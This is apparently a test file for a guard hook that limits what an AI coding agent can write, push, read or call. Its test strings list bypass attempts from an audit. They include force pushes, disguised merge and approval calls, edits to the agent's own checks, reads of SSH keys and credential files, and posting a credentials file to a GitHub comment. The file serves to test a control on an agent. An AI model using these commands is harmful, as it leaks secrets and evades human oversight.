"""The guard is the fence that holds at night. These tests pin what it blocks and what it lets through,
including every bypass the independent audit of 2026-11-07 found."""
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

import guard

ROOT = Path(__file__).resolve().parents[2]
REPO = "adamchungrei-wq/code-tower-sandbox"
HOME = os.path.expanduser("~")


class StubEnv(guard.Env):
    """A repo at /repo whose branch diff and body files the test controls."""

    def __init__(self, changed=(), files=None, repo=REPO):
        super().__init__(project_dir="/repo")
        self.changed, self.files, self._repo = list(changed), files or {}, repo

    def toplevel(self, path):
        full = os.path.normpath(path)
        return "/repo" if (full + "/").startswith("/repo/") else ""

    def rules(self, path):
        return {"github_repo": self._repo, "tamper_paths": []}

    def diff_names(self, where, src):
        return list(self.changed)

    def read(self, path):
        return self.files.get(os.path.basename(path))


CLEAN = {"E1-body.md": "## What changed\nAdds slugify.\n", "E1-note.md": "Checked: done test passes."}


def ok(tool, inp, env=None, cwd="/repo"):
    return guard.decide(tool, inp, cwd, env or StubEnv(files=CLEAN))[0]


def bash(cmd, env=None):
    return ok("Bash", {"command": cmd}, env)


# --- files ---------------------------------------------------------------------------------------------
def test_workers_may_edit_code_tests_and_scratch_files():
    assert ok("Write", {"file_path": "/repo/src/textkit/slug.py"})
    assert ok("Edit", {"file_path": "/repo/tests/test_slug.py"})
    assert ok("Write", {"file_path": "/repo/runs/ct/E1-body.md"})
    assert ok("Write", {"file_path": "/tmp/scratch.txt"})


def test_the_loops_rules_are_never_written_on_any_branch():
    for path in ("checks/e1_slugify.py", "rules/project.json", ".claude/settings.json", ".claude/hooks/guard.py",
                 ".claude/agents/worker.md", ".claude/skills/code-tower/SKILL.md", ".github/workflows/x.yml",
                 "tower/select_rows.py", "tests/fence/test_guard.py", "PLAN.md", "CLAUDE.md", "pyproject.toml",
                 ".git/config", ".gitignore", "src/../checks/e1_slugify.py"):
        assert not ok("Write", {"file_path": f"/repo/{path}"}), path
        assert not ok("Edit", {"file_path": path}), path            # relative to the session folder


def test_secrets_are_never_read_searched_or_written():
    for tool, inp in (("Read", {"file_path": "/repo/.env"}), ("Read", {"file_path": f"{HOME}/.claude/.credentials.json"}),
                      ("Grep", {"pattern": "ghp_", "path": f"{HOME}/.config/gh"}), ("Glob", {"pattern": "**/.env"}),
                      ("Read", {"file_path": f"{HOME}/.ssh/id_ed25519"}), ("Write", {"file_path": "/repo/prod.env"})):
        assert not ok(tool, inp), (tool, inp)
    assert not ok("Read", {"file_path": f"{HOME}/notes.txt"})          # home folder outside the repo
    assert ok("Read", {"file_path": "/repo/PLAN.md"})
    assert ok("Grep", {"pattern": "slugify", "path": "/repo/src"})


# --- git push ------------------------------------------------------------------------------------------
def test_push_only_row_branches_in_exact_shapes():
    for cmd in ("git push -u origin tower/e1", "git push origin HEAD:tower/e1", "git push origin HEAD:refs/heads/tower/e1",
                "git push origin claude/tower-e1", "git -C /repo push origin tower/e2"):
        assert bash(cmd), cmd
    for cmd in ("git push", "git push origin", "git push origin main", "git push origin rules/x",
                "git push origin tower/e1:main", "git push upstream tower/e1", "git push https://x.example/y tower/e1",
                "git push origin tower/E1", "git push origin feature/x", "git push origin HEAD"):
        assert not bash(cmd), cmd


def test_push_tricks_from_the_audit_are_blocked():
    for cmd in ("git -c push.default=upstream push", "git --no-pager push origin tower/e1",
                "git -c remote.origin.mirror=true push origin tower/e1", "GIT_DIR=/tmp/x git push origin tower/e1",
                "git -P push origin tower/e1", "git push --force origin tower/e1", "git push -f origin tower/e1",
                "git push origin --delete tower/e2", "git push origin :tower/e2", "git push --mirror", "git push --all",
                "git push origin +tower/e1", "timeout 5 git push origin tower/e1"):
        assert not bash(cmd), cmd


def test_push_refused_when_the_branch_changes_the_loops_rules():
    env = StubEnv(changed=["src/textkit/slug.py", ".github/workflows/x.yml"])
    assert not bash("git push -u origin tower/e1", env)
    assert bash("git push -u origin tower/e1", StubEnv(changed=["src/textkit/slug.py", "tests/test_slug.py"]))


def test_other_git_writes():
    for cmd in ("git config user.name x", "git remote add evil https://x", "git remote set-url origin x",
                "git apply /tmp/p.diff", "git checkout -- PLAN.md", "git restore --source=origin/main rules/project.json",
                "git rm checks/e1_slugify.py", "git fetch https://x.example/repo", "git send-pack x",
                "git update-ref refs/heads/main HEAD", "git reset --hard origin/main"):
        assert not bash(cmd), cmd
    for cmd in ("git switch tower/e2", "git switch --no-track -c tower/e1 origin/main", "git fetch origin",
                "git log --oneline | head -5", "git add -A", "git commit -m 'E1: slugify'", "git diff --cached --stat origin/main",
                "git ls-remote --heads origin 'tower/*'", "git worktree add /tmp/ct-e1 origin/tower/e1"):
        assert bash(cmd), cmd


# --- gh ------------------------------------------------------------------------------------------------
PR = (f"gh api repos/{REPO}/pulls -X POST -f title='E1: slugify' -f head=tower/e1 -f base=main -F draft=true "
      "-F body=@runs/ct/E1-body.md --jq '{number, html_url}'")


def test_gh_allowed_shapes():
    for cmd in (f"gh api repos/{REPO}/pulls --jq '[.[] | {{number, branch: .head.ref, draft}}]'",
                f"gh api repos/{REPO}/pulls -X GET -f state=all -f per_page=50",
                f"gh api repos/{REPO}/commits/abc123/check-runs --jq '.check_runs[].conclusion'",
                f"gh api repos/{REPO}/issues/3/comments", f"gh api repos/{REPO}/pulls/3/reviews --paginate",
                PR, f"gh api repos/{REPO}/issues/3/comments -X POST -F body=@runs/ct/E1-note.md", "gh auth status"):
        assert bash(cmd), cmd


def test_gh_bypasses_from_the_audit_are_blocked():
    for cmd in (f"gh api repos/{REPO}/git/refs/heads/main -XPATCH -fsha=abc -Fforce=true",
                f"gh api repos/{REPO}/git/refs/heads/tower/e2 -XDELETE",
                f"gh api repos/{REPO}/pulls/3 -XPATCH -fstate=closed",
                f"gh api repos/{REPO}/pulls -XPOST -fhead=tower/e1 -fbase=main -ftitle=t",
                f"M=merge; gh api repos/{REPO}/pulls/3/$M -X PUT",
                f"env gh api repos/{REPO}/pulls/3/reviews -f event=APPROVE",
                f"echo repos/{REPO}/pulls/3/merge | xargs -I{{}} gh api {{}} -X PUT",
                f"gh api repos/{REPO}/contents/README.md -X PUT -f message=x -f branch=main",
                "gh api repos/someone-else/repo/pulls", "gh api graphql -f query=x", "gh auth status --show-token",
                f"gh api repos/{REPO}/pulls -X POST -f title=x -f head=tower/e1 -f base=main -F body=@runs/ct/E1-body.md",
                PR.replace("-F draft=true", "-F draft=false"), PR.replace("head=tower/e1", "head=rules/x"),
                PR.replace("@runs/ct/E1-body.md", "@.env"), PR.replace("@runs/ct/E1-body.md", "@/tmp/x.md"),
                PR + " -H 'X: y'", f"gh api repos/{REPO}/pulls -X POST --input /tmp/x.json",
                f"gh api repos/{REPO}/issues/3/comments -X POST -F body=@{HOME}/.claude/.credentials.json",
                f"gh api repos/{REPO}/pulls/3/reviews -X POST -f event=APPROVE",
                f"gh api repos/{REPO}/pulls/3/ccr/ready_for_review -X POST",
                f"gh api repos/{REPO}/merges -X POST -f base=main -f head=tower/e1",
                "gh pr merge 3", "gh pr create --draft --title x", "gh repo edit"):
        assert not bash(cmd), cmd


def test_a_body_file_with_a_secret_is_not_posted():
    env = StubEnv(files={"E1-body.md": "token: ghp_" + "a" * 36})
    assert not bash(PR, env)


# --- other shell ---------------------------------------------------------------------------------------
def test_wrappers_web_env_and_python_shapes():
    for cmd in ("rm -rf src", "curl https://example.com", "wget x", "cat .env", "cat .en?", "env", "printenv HOME",
                "export -p", "set", "bash -c 'gh pr merge 1'", "sh -c ls", "xargs ls", "eval ls", "ssh host",
                "python3 script.py", "python3 -m http.server", "python3 -c 'print(1)'", "pip install requests"):
        assert not bash(cmd), cmd
    for cmd in ("python3 -I -m pytest -q", "python3 -I checks/run_checks.py > runs/ct/checks.json",
                "python3 -I tower/select_rows.py runs/ct/checks.json runs/ct/heads.txt", "python3 -m pip install --quiet pytest",
                "date -u", "mkdir -p runs/ct", "cat checks/e1_slugify.py", "echo hi > runs/ct/note.md"):
        assert bash(cmd), cmd


def test_shell_writes_to_the_loops_rules_are_blocked():
    for cmd in ("sed -i 's/assert/pass/' checks/e1_slugify.py", "echo '{}' > rules/project.json",
                "cp /tmp/x.py tower/select_rows.py", "dd if=/tmp/x of=checks/e1_slugify.py", "cp x src/../checks/e1.py",
                "tee .github/workflows/x.yml", "touch .claude/hooks/guard.py", "mv src/x.py PLAN.md"):
        assert not bash(cmd), cmd


def test_parser_edge_cases():
    for cmd in ("echo $(gh pr merge 3)", "echo `gh pr merge 3`", 'echo "$(gh pr merge 3)"',
                'X="$(git push --force origin tower/e1)"', "git push origin 'tower/e1"):
        assert not bash(cmd), cmd
    assert bash("python3 -I checks/run_checks.py 2>/dev/null")


# --- MCP and web ---------------------------------------------------------------------------------------
def test_notion_reads_and_one_coordination_entry_only():
    entry = {"parent": {"data_source_id": guard.COORD_DS}, "pages": [{"properties": {"Entry": "round 1"}}]}
    assert ok("mcp__Notion__notion-fetch", {"id": "abc"})
    assert ok("mcp__claude_ai_Notion__notion-search", {"query": "x"})
    assert ok("mcp__Notion__notion-create-pages", entry)
    assert ok("mcp__Notion__notion-create-pages", {**entry, "parent": {"data_source_id": "collection://" + guard.COORD_DS}})
    assert not ok("mcp__Notion__notion-create-pages", {**entry, "parent": {"page_id": "x", "note": guard.COORD_DS}})
    assert not ok("mcp__Notion__notion-create-pages", {**entry, "pages": [{"content": "sk-ant-" + "a" * 30}]})
    assert not ok("mcp__Notion__notion-update-page", {"page_id": "x"})


def test_other_apps_are_closed():
    for tool in ("mcp__Airtable__list_records_for_table", "mcp__Slack__slack_read_channel", "mcp__Gmail__search_threads",
                 "mcp__github__create_pull_request", "mcp__claude-in-chrome__read_page", "mcp__n8n__search_workflows"):
        assert not ok(tool, {}), tool
    assert not ok("WebFetch", {"url": "https://example.com"})
    assert not ok("WebSearch", {"query": "x"})


# --- real git, end to end ------------------------------------------------------------------------------
def _git(*args, cwd):
    subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", *args], cwd=cwd, check=True,
                   capture_output=True)


def test_real_repo_pre_push_diff(tmp_path):
    remote, work = tmp_path / "remote.git", tmp_path / "work"
    _git("init", "-q", "--bare", "-b", "main", str(remote), cwd=tmp_path)
    _git("clone", "-q", str(remote), str(work), cwd=tmp_path)
    (work / "rules").mkdir()
    (work / "rules" / "project.json").write_text(json.dumps({"github_repo": REPO}))
    _git("add", "-A", cwd=work)
    _git("commit", "-q", "-m", "init", cwd=work)
    _git("push", "-q", "origin", "HEAD:main", cwd=work)
    _git("fetch", "-q", "origin", cwd=work)
    env = guard.Env(project_dir=str(work))
    _git("switch", "-q", "--no-track", "-c", "tower/e1", "origin/main", cwd=work)
    (work / "src").mkdir()
    (work / "src" / "slug.py").write_text("x = 1\n")
    _git("add", "-A", cwd=work)
    _git("commit", "-q", "-m", "E1", cwd=work)
    assert guard.decide("Bash", {"command": "git push -u origin tower/e1"}, str(work), env)[0]
    assert not guard.decide("Write", {"file_path": str(work / "rules" / "project.json")}, str(work), env)[0]
    (work / ".github").mkdir()
    (work / ".github" / "x.yml").write_text("on: push\n")
    _git("add", "-A", cwd=work)
    _git("commit", "-q", "-m", "sneak", cwd=work)
    assert not guard.decide("Bash", {"command": "git push -u origin tower/e1"}, str(work), env)[0]


# --- the hook itself -----------------------------------------------------------------------------------
@pytest.mark.parametrize("payload, code", [
    (json.dumps({"tool_name": "Bash", "tool_input": {"command": "gh pr merge 1"}, "cwd": "/tmp"}), 2),
    (json.dumps({"tool_name": "Read", "tool_input": {"file_path": str(ROOT / "PLAN.md")}, "cwd": str(ROOT)}), 0),
    ("not json", 2),
    (json.dumps({"tool_name": "Bash", "tool_input": "not a dict"}), 2),
    (json.dumps(["not", "an", "object"]), 2),
])
def test_hook_exit_codes(payload, code):
    hook = ROOT / ".claude" / "hooks" / "guard.py"
    run = subprocess.run([sys.executable, "-I", str(hook)], input=payload, text=True, capture_output=True,
                         env={**os.environ, "CLAUDE_PROJECT_DIR": str(ROOT)})
    assert run.returncode == code, run.stderr
